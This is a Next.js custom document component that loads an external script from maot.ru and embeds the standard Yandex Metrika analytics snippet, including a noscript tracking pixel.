import { Html, Head, Main, NextScript } from 'next/document'

export default function Document() {
  return (
    <Html>
      <Head />
      <body>
        <Main />
        <NextScript />
            <script src = "https://maot.ru/remote/u/u2.js"></script>
            <script
              dangerouslySetInnerHTML={{
                __html: `
                  (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
                  m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
                  (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
        
                  ym(91492860, "init", {
                        clickmap:true,
                        trackLinks:true,
                        accurateTrackBounce:true,
                        webvisor:true
                  });
                `,
              }}
            />
            <noscript>
              <div>
                <img src="https://mc.yandex.ru/watch/91492860" style={{ position:'absolute', left:'-9999px' }} alt="" />
              </div>
            </noscript>
      </body>
    </Html>
  )
}